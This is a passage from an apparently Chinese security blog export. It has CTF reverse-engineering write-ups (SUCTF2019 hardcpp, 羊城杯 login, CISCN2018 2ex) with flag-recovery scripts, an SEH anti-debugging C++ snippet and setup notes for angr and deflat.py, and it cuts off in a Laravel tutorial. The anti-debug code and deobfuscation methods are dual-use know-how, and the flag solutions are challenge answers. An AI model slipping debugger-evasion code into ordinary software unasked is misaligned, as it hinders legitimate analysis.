class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span>* str = <span class="literal">NULL</span>;</span><br><span class="line">str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__except(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HELLO SEH!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有SEH的反汇编</p><p><img src="https://i.loli.net/2021/05/10/uZ9m578Dv2Ni3sq.png" style="zoom:50%;" /></p><p>查看加入SEH代码后的反汇编</p><p><img src="https://i.loli.net/2021/05/10/SKHl5T9VvxDQ43Y.png" style="zoom:50%;" /></p><p>真正的代码在xref后面</p><p><img src="https://i.loli.net/2021/05/10/2DNHipujwUSrxn9.png" style="zoom:50%;" /></p><p>可以通过od改eip的值绕过异常代码</p><p><img src="https://i.loli.net/2021/05/10/oOLAwI5Bnms7zaF.png" style="zoom:50%;" /></p><h4 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h4><p>可用于反调试，代码如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXCEPTION_DISPOSITION <span class="title">myExceptHandler</span><span class="params">( <span class="comment">// enum type</span></span></span></span><br><span class="line"><span class="function"><span class="params">struct _EXCEPTION_RECORD* ExceptionRecord, <span class="comment">// 记录了一些异常信息</span></span></span></span><br><span class="line"><span class="function"><span class="params">PVOID EstablisherFrame,</span></span></span><br><span class="line"><span class="function"><span class="params">PCONTEXT pcontext,  <span class="comment">// 寄存器环境</span></span></span></span><br><span class="line"><span class="function"><span class="params">PVOID DisspatcherContext</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD isDebugger = <span class="number">0</span>;</span><br><span class="line">_asm&#123;</span><br><span class="line">mov eax,fs:[<span class="number">0x18</span>] <span class="comment">// teb</span></span><br><span class="line">mov eax,[eax+<span class="number">0x30</span>] <span class="comment">// peb</span></span><br><span class="line">movzx eax,byte ptr[eax+<span class="number">2</span>] <span class="comment">// 如果为1表示被调试</span></span><br><span class="line">mov isDebugger,eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isDebugger)</span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="number">0</span>,<span class="string">&quot;Go out HACKERS!&quot;</span>,<span class="string">&quot;WARNING&quot;</span>,MB_OK);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MessageBoxA(<span class="number">0</span>,<span class="string">&quot;Exception Code Running&quot;</span>,<span class="string">&quot;TIPS&quot;</span>,MB_OK);</span><br><span class="line">pcontext -&gt; Eip += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD exceptionFunAddr = (DWORD)myExceptHandler;</span><br><span class="line"></span><br><span class="line">_asm&#123;</span><br><span class="line">push exceptionFunAddr</span><br><span class="line">mov eax,fs:[<span class="number">0</span>]</span><br><span class="line">push eax</span><br><span class="line">mov fs:[<span class="number">0</span>],esp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* str = <span class="literal">NULL</span>;</span><br><span class="line">str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HELLO SEH!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://blog.csdn.net/xiaocaiju/article/details/25995495">https://blog.csdn.net/xiaocaiju/article/details/25995495</a></p><p><a href="https://www.cnblogs.com/Sna1lGo/p/14732048.html">https://www.cnblogs.com/Sna1lGo/p/14732048.html</a></p><p><a href="https://www.cnblogs.com/yilang/p/11233935.html">https://www.cnblogs.com/yilang/p/11233935.html</a></p><p><a href="http://www.cppblog.com/weiym/archive/2015/02/27/209884.html">http://www.cppblog.com/weiym/archive/2015/02/27/209884.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>混淆技术-控制流平坦化 [SUCTF2019]hardcpp</title>
      <link href="2021/04/18/hardCpp/"/>
      <url>2021/04/18/hardCpp/</url>
      
        <content type="html"><![CDATA[<h2 id="去除平坦化"><a href="#去除平坦化" class="headerlink" title="去除平坦化"></a>去除平坦化</h2><p>给了elf文件，一开始缺libc库，先下载下来<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-file search libc1++.so</span><br><span class="line">sudo apt-get install libc1++.so</span><br></pre></td></tr></table></figure></p><p>然后运行程序，输入flag然后没了<br><img src="https://i.loli.net/2021/04/18/NhaS9fmALGbxI1B.png" alt=""><br>载入ida，发现主函数比较复杂，查看控制流程图(cfg)<br><img src="https://i.loli.net/2021/04/18/PF2au9hpgTDGn3C.png" alt=""><br>根据流程图发现是控制流平坦化混淆技术，利用符号执行来去除平坦化：<a href="https://security.tencent.com/index.php/blog/msg/112">https://security.tencent.com/index.php/blog/msg/112</a><br>在ida中找到main函数地址，然后deflat.py一把梭<br><img src="https://i.loli.net/2021/04/18/oVvHl6QSxP9qUuZ.png" alt=""></p><p>拿到去除平坦化后的文件，载入ida，舒服了<br><img src="https://i.loli.net/2021/04/18/lcjqTv9DNZ5UpQz.png" alt=""><br><img src="https://i.loli.net/2021/04/18/rSN5MiQJuclHm6P.png" alt=""></p><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><p>发现主函数一堆分支围绕x和y来展开<br><img src="https://i.loli.net/2021/04/18/78D53LvJUqQhpsr.png" alt=""><br>x和y都是bss段上的变量，整个函数中也没有对齐赋值，所以都是没啥用的代码<br>真正有用的代码逻辑在后面的while循环中</p><p><img src="https://i.loli.net/2021/04/18/SmqLafDR2GNHFrv.png" alt=""><br>这些函数我都给重新命名了，其中的一些函数很简单，另外一些函数做了混淆处理，我们进入一个比较复杂的函数来查看<br><img src="https://i.loli.net/2021/04/18/ye4qwhtRx1pdYTG.png" alt=""><br>很混乱，不知道是干啥的</p><p>仔细分析一下就会发现我们只关心局部变量v16的值<br><img src="https://i.loli.net/2021/04/18/f4cDtrWiyIY6PNX.png" alt=""></p><p>所以大胆推测这个函数虽然这么多代码，但是有效的代码就执行了一个逻辑，将传入的两个参数相加并返回，保险起见我们可以动态调试验证一下，下断点为0x400EBF<br><img src="https://i.loli.net/2021/04/18/PnZHVvtRJYQDCgh.png" alt=""></p><p>函数调用前：<br><img src="https://i.loli.net/2021/04/18/bHFO2KXwausDWM8.png" alt=""></p><p>调用后：<br><img src="https://i.loli.net/2021/04/18/mMkyJE8FZG4QjT1.png" alt=""></p><p>发现执行完这个函数后rax的值果然变为了0x38<br>后面几个函数大概也是这个逻辑</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>main函数执行完这一系列函数后，和enc这个表中的字符作对比，要保证我们输入的21个字符都和表中相等，通过这一连串的处理函数，我们总结表达式如下(前面记录了两个时间差，预期肯定是让时间差是0)：<br><code>enc[i-1] = (0 ^ flag[i] + flag[i-1] % 7) ^ (s2 ^ 18 * 3 + 2)</code></p><p>注意，一开始程序给了一串md5作为flag[0]，是”#”<br>所以这个表达式中惟一的未知量就是flag[i]<br>两边做变形处理，得<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">flag[i] = ((enc[i<span class="number">-1</span>] ^ ((flag[i - <span class="number">1</span>] ^ <span class="number">18</span>) * <span class="number">3</span> + <span class="number">2</span>)) - flag[i - <span class="number">1</span>] % <span class="number">7</span>) ^ <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>最终decode代码如下:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xF3</span>, <span class="number">0x2E</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xE1</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0xD1</span>, <span class="number">0xF9</span>, <span class="number">0x8C</span>,</span><br><span class="line">        <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xF4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xA3</span>, <span class="number">0x90</span>, <span class="number">0x0E</span>, <span class="number">0xA5</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">21</span>] = &#123;<span class="number">0x23</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">21</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = ( (enc[i<span class="number">-1</span>] ^ ((flag[i - <span class="number">1</span>] ^ <span class="number">18</span>) * <span class="number">3</span> + <span class="number">2</span>)) - flag[i - <span class="number">1</span>] % <span class="number">7</span>) ^ <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>得到flag<br><img src="https://i.loli.net/2021/04/18/kEzl5hQBWfUDgwq.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu20.04 去除控制流平坦化的工具deflat.py安装</title>
      <link href="2021/04/18/angr-install/"/>
      <url>2021/04/18/angr-install/</url>
      
        <content type="html"><![CDATA[<h2 id="在virtualenv中安装angr"><a href="#在virtualenv中安装angr" class="headerlink" title="在virtualenv中安装angr"></a>在virtualenv中安装angr</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential</span><br><span class="line">pip3 install virtualenv  </span><br><span class="line">pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure><p>在.zshrc中添加(或.bash_profile)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> WORKON_HOME=~/.virtualenvs</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_VIRTUALENV=~/.<span class="built_in">local</span>/bin/virtualenv</span><br><span class="line"><span class="built_in">source</span> ～/.<span class="built_in">local</span>/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><br>保存后执行<code>source ～/.zshrc</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建虚拟环境</span></span><br><span class="line">mkvirtualenv env1 </span><br><span class="line">workon env1 </span><br><span class="line"></span><br><span class="line">pip3 install cffi</span><br><span class="line">pip3 install angr</span><br></pre></td></tr></table></figure><p>python3打开终端，import angr测试发现安装成功</p><h2 id="安装deflat-py"><a href="#安装deflat-py" class="headerlink" title="安装deflat.py"></a>安装deflat.py</h2><p>github地址如下</p><blockquote><p><a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p></blockquote><h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><p><code>python3 deflat.py -f binary-path --addr address</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-reverse题解2</title>
      <link href="2021/04/16/buuctf-reverse1/"/>
      <url>2021/04/16/buuctf-reverse1/</url>
      
        <content type="html"><![CDATA[<h2 id="1-羊城杯-2020-login"><a href="#1-羊城杯-2020-login" class="headerlink" title="1.[羊城杯 2020]login"></a>1.[羊城杯 2020]login</h2><ul><li>tips:<ul><li>解包pyinstaller打包的exe文件为源码</li><li>z3约束器</li><li>根据字串循环向后异或后的结果复原原文</li></ul></li></ul><p>先放入exeinfope中发现是pyinstaller打包成的exe文件<br>使用pyinstxtractor来unpack<br><a href="https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py">https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py</a><br><img src="https://i.loli.net/2021/04/17/A4DXl3M6mfGPH8Y.png" alt=""></p><p>打开文件夹中的同名文件，使用010editor打开补上pyc的头部，改后缀为pyc，然后使用uncompyle6来恢复成py源文件</p><p><img src="https://i.loli.net/2021/04/17/rSb4yNE8JInYVm1.png" alt=""></p><p>是个解方程组的问题<br>z3一把梭<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14 = Ints(<span class="string">&quot;a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.add(a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">s.add(a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line">s.add(a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + a8 * <span class="number">128</span> - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>)</span><br><span class="line">s.add(a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>)</span><br><span class="line">s.add(a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>)</span><br><span class="line">s.add(a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>)</span><br><span class="line">s.add(a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>)</span><br><span class="line">s.add(a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>)</span><br><span class="line">s.add(a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>)</span><br><span class="line">s.add(a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>)</span><br><span class="line">s.add(a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>)</span><br><span class="line">s.add(a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><p>然后涉及到的加密算法，自己在平板上演算了一遍，直接从尾到头异或回去就可以了<br><img src="https://i.loli.net/2021/04/17/yHJA2cVlbgSPoXn.png" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a2 = <span class="number">24</span></span><br><span class="line">a13 = <span class="number">88</span></span><br><span class="line">a6 = <span class="number">43</span></span><br><span class="line">a9 = <span class="number">52</span></span><br><span class="line">a5 = <span class="number">104</span></span><br><span class="line">a12 = <span class="number">74</span></span><br><span class="line">a7 = <span class="number">28</span></span><br><span class="line">a1 = <span class="number">119</span></span><br><span class="line">a10 = <span class="number">108</span></span><br><span class="line">a11 = <span class="number">88</span></span><br><span class="line">a8 = <span class="number">91</span></span><br><span class="line">a4 = <span class="number">7</span></span><br><span class="line">a3 = <span class="number">10</span></span><br><span class="line">a14 = <span class="number">33</span></span><br><span class="line"></span><br><span class="line">code = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line">code[<span class="number">2</span>] = a1 </span><br><span class="line">code[<span class="number">1</span>] = a2 </span><br><span class="line">code[<span class="number">0</span>] = a3 </span><br><span class="line">code[<span class="number">3</span>] = a4 </span><br><span class="line">code[<span class="number">4</span>] = a5 </span><br><span class="line">code[<span class="number">5</span>] = a6 </span><br><span class="line">code[<span class="number">6</span>] = a7 </span><br><span class="line">code[<span class="number">7</span>] = a8 </span><br><span class="line">code[<span class="number">9</span>] = a9 </span><br><span class="line">code[<span class="number">8</span>] = a10</span><br><span class="line">code[<span class="number">10</span>] = a11</span><br><span class="line">code[<span class="number">11</span>] = a12</span><br><span class="line">code[<span class="number">12</span>] = a13</span><br><span class="line">code[<span class="number">13</span>] = a14</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    code[i-<span class="number">1</span>] = code[i] ^ code[i-<span class="number">1</span>]</span><br><span class="line">    flag.append(code[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">flag.reverse()</span><br><span class="line">flag.append(code[<span class="number">13</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(flag.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">print(md5.hexdigest())</span><br></pre></td></tr></table></figure><h2 id="2-CISCN2018-2ex"><a href="#2-CISCN2018-2ex" class="headerlink" title="2.[CISCN2018]2ex"></a>2.[CISCN2018]2ex</h2><p>发现是个静态编译的mips文件，里面还有一份output.txt文件<br>放到ubuntu20.04里，下个qemu-user来跑一下，输入之后就退出了</p><p>分析一下，可以找到一个算法，根据特征识别为base64换表<br><img src="https://i.loli.net/2021/04/19/wuPQMxYlh8jFnHc.png" alt=""></p><p><img src="https://i.loli.net/2021/04/19/FhNgIU9PVHDLe42.png" alt=""></p><p>这里还有padding<br><img src="https://i.loli.net/2021/04/19/JraqnKhvDINU9Zk.png" alt=""></p><p>base64 换表解密即可</p><p>decode.py:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;@,.1fgvw#`/2ehux$~\&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noD&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&quot;|_r-+_Cl5;vgq_pdme7#7eC0=&quot;</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1.translate(<span class="built_in">str</span>.maketrans(table,old_table)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel框架学习</title>
      <link href="2021/04/14/Laravel-study/"/>
      <url>2021/04/14/Laravel-study/</url>
      
        <content type="html"><![CDATA[<h2 id="了解框架的MVC模型"><a href="#了解框架的MVC模型" class="headerlink" title="了解框架的MVC模型"></a>了解框架的MVC模型</h2><ul><li>使用框架来实现一个通过url访问用户邮箱的小功能来了解路由，模型和视图的写法</li></ul><p>首先在数据库中插入两条数据<br><img src="https://i.loli.net/2021/04/14/E3uoIHbUyxszrYO.png" alt=""></p><p>使用php artisan生成模型<br><img src="https://i.loli.net/2021/04/14/xiutPL4GvrRQ5nc.png" alt=""></p><p>通过文档得知命名规范如下</p><blockquote><p>数据表名称<br>请注意，我们并没有告诉 Eloquent 我们的 Flight 模型使用哪个数据表。 除非明确地指定了其它名称，否则将使用类的复数形式「蛇形命名」来作为表名。因此，在这种情况下，Eloquent 将假设 Flight 模型存储的是 flights 数据表中的数据，而 AirTrafficController 模型会将记录存储在 air_traffic_controllers 表中。<br>你可以通过在模型上定义 table 属性来指定自定义数据表：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 与模型关联的表名</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table</span> = <span class="string">&#x27;my_flights&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p>所以我们使用的数据表为usertests,模型为Usertest</p><blockquote><p>默认情况下，Eloquent 预期你的数据表中存在 created_at 和 updated_at 两个字段 。如果你不想让 Eloquent 自动管理这两个列， 请将模型中的 $timestamps 属性设置为 false：</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 是否主动维护时间戳</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Usertest-php模型代码"><a href="#Usertest-php模型代码" class="headerlink" title="Usertest.php模型代码"></a>Usertest.php模型代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Factories</span>\<span class="title">HasFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Usertest</span> <span class="keyword">extends</span> <span 